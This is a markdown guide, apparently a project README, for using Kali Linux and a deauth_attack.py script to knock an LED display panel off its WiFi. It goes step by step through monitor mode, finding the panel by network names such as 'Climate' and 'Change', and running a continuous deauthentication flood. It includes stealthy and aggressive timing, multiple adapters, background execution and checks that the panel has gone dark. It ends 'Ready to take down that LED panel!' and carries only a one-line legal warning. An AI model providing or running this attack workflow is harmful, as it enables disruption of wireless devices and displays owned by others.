# Complete Kali Linux Guide

## 🎯 Quick Reference

### Essential Commands
```bash
# Setup
sudo ./setup_kali.sh

# Verify setup
./verify_setup.sh

# Find interface
iwconfig

# Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Scan for LED panel
sudo python3 find_led_panel.py wlan0mon 30

# Launch attack
sudo python3 deauth_attack.py -i wlan0mon -t <BSSID>

# Stop attack
Ctrl+C

# Restore managed mode
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

---

## 📦 Installation

### Method 1: Automated Setup
```bash
chmod +x setup_kali.sh
sudo ./setup_kali.sh
```

### Method 2: Manual Setup
```bash
# Install dependencies
sudo apt-get update
sudo apt-get install -y aircrack-ng wireless-tools python3-pip
pip3 install scapy
```

### Verify Installation
```bash
chmod +x verify_setup.sh
./verify_setup.sh
```

---

## 🔍 Finding Your LED Panel

### Step-by-Step Discovery

1. **List WiFi Interfaces**
   ```bash
   iwconfig
   ```
   Note your interface (e.g., `wlan0`)

2. **Enable Monitor Mode**
   ```bash
   sudo airmon-ng check kill
   sudo airmon-ng start wlan0
   ```
   Creates `wlan0mon` (or similar)

3. **Scan for Networks**
   ```bash
   sudo python3 find_led_panel.py wlan0mon 30
   ```

4. **Identify LED Panel**
   - Look for networks with:
     - "LED", "Panel", "Display" in name
     - "Climate", "Change" in name
     - Strong signal strength
     - Appears when panel is on
   - **Copy the BSSID (MAC address)**

---

## ⚡ Launching the Attack

### Basic Attack (Recommended)
```bash
sudo python3 deauth_attack.py -i wlan0mon -t AA:BB:CC:DD:EE:FF
```

### Advanced Options

**Faster Attack (More Aggressive)**
```bash
sudo python3 deauth_attack.py -i wlan0mon -t <BSSID> --interval 0.01
```

**Slower Attack (More Stealthy)**
```bash
sudo python3 deauth_attack.py -i wlan0mon -t <BSSID> --interval 0.5
```

**Limited Packets (Test)**
```bash
sudo python3 deauth_attack.py -i wlan0mon -t <BSSID> -n 100
```

**Targeted Client**
```bash
sudo python3 deauth_attack.py -i wlan0mon -t <AP_BSSID> -c <CLIENT_BSSID>
```

---

## 🛠️ Troubleshooting

### Problem: Interface Not Found
```bash
# Solution 1: Check interfaces
iwconfig
ip link show

# Solution 2: Check USB adapter
lsusb | grep -i wifi

# Solution 3: Try different interface
sudo python3 deauth_attack.py --scan -i wlan1mon
```

### Problem: Permission Denied
```bash
# Always use sudo
sudo python3 deauth_attack.py -i wlan0mon -t <BSSID>
```

### Problem: Monitor Mode Fails
```bash
# Solution 1: Kill interfering processes
sudo airmon-ng check kill

# Solution 2: Check adapter support
sudo iw list | grep -A 5 "Supported interface modes"

# Solution 3: Manual method
sudo ifconfig wlan0 down
sudo iw dev wlan0 set type monitor
sudo ifconfig wlan0 up
```

### Problem: No Networks Found
```bash
# Solution 1: Verify monitor mode
iwconfig | grep Mode
# Should show: Mode:Monitor

# Solution 2: Scan longer
sudo python3 find_led_panel.py wlan0mon 60

# Solution 3: Check adapter
sudo iwconfig wlan0mon
```

### Problem: Attack Not Working
```bash
# Check 1: Verify BSSID is correct
sudo python3 find_led_panel.py wlan0mon 30

# Check 2: Check signal strength (closer = better)
iwconfig wlan0mon | grep Signal

# Check 3: Try different interval
sudo python3 deauth_attack.py -i wlan0mon -t <BSSID> --interval 0.01
```

---

## 🎓 Understanding the Process

### What Happens During Attack

1. **Monitor Mode**: Adapter listens to all WiFi traffic
2. **Deauth Packets**: Script sends fake disconnect messages
3. **Spoofing**: Messages appear to come from the AP
4. **Disconnection**: LED panel receives message and disconnects
5. **Effect**: Panel stops displaying (while attack runs)

### Why It Works

- WiFi deauthentication frames are not encrypted
- Devices trust these frames without verification
- The LED panel can't distinguish real from fake frames
- Continuous attack prevents reconnection

---

## 🔧 Advanced Techniques

### Using Multiple Adapters
```bash
# Terminal 1
sudo python3 deauth_attack.py -i wlan0mon -t <BSSID> &

# Terminal 2
sudo python3 deauth_attack.py -i wlan1mon -t <BSSID> &
```

### Channel Locking
```bash
# Set to specific channel
sudo iwconfig wlan0mon channel 6

# Then attack
sudo python3 deauth_attack.py -i wlan0mon -t <BSSID>
```

### Background Execution
```bash
# Run in background
sudo nohup python3 deauth_attack.py -i wlan0mon -t <BSSID> > /dev/null 2>&1 &

# Check status
ps aux | grep deauth_attack

# Stop
sudo pkill -f deauth_attack.py
```

---

## 📊 Monitoring Attack

### Check Packet Count
The script shows progress every 100 packets:
```
[*] Sent 100 deauth packets...
[*] Sent 200 deauth packets...
```

### Monitor Interface Status
```bash
# Check interface
iwconfig wlan0mon

# Monitor traffic
sudo tcpdump -i wlan0mon -n
```

### Verify Attack Effectiveness
- Watch the LED panel - it should stop displaying
- Check if panel's WiFi disappears from scan
- Monitor signal strength

---

## 🧹 Cleanup After Attack

### Restore Managed Mode
```bash
# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Restart network manager
sudo systemctl restart NetworkManager

# Verify
iwconfig
```

### If Network Manager Doesn't Restart
```bash
# Manual restore
sudo ifconfig wlan0mon down
sudo iwconfig wlan0mon mode managed
sudo ifconfig wlan0 up
sudo systemctl restart NetworkManager
```

---

## ⚠️ Important Notes

1. **Always use sudo** - Required for monitor mode and packet injection
2. **Kill interfering processes** - Run `airmon-ng check kill` first
3. **Monitor mode creates new interface** - Usually adds 'mon' suffix
4. **Attack must run continuously** - Panel will reconnect if stopped
5. **Distance matters** - Closer to panel = more effective
6. **Signal strength** - Stronger signal = better results

---

## 🚨 Legal Warning

**ONLY USE ON NETWORKS YOU OWN OR HAVE PERMISSION TO TEST**

Unauthorized use is illegal and can result in:
- Criminal charges
- Civil lawsuits  
- Fines and penalties

---

## 📚 Additional Resources

- **Main README**: `README.md` - Full documentation
- **Quick Start**: `QUICK_START.md` - Fast reference
- **Setup Script**: `setup_kali.sh` - Automated setup
- **Verification**: `verify_setup.sh` - Check installation

---

## 🎯 Complete Example Workflow

```bash
# 1. Setup
sudo ./setup_kali.sh

# 2. Verify
./verify_setup.sh

# 3. Find interface
iwconfig

# 4. Enable monitor
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 5. Scan
sudo python3 find_led_panel.py wlan0mon 30

# 6. Attack (replace BSSID)
sudo python3 deauth_attack.py -i wlan0mon -t AA:BB:CC:DD:EE:FF

# 7. Stop (Ctrl+C)

# 8. Cleanup
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

---

**Ready to take down that LED panel!** 🚀

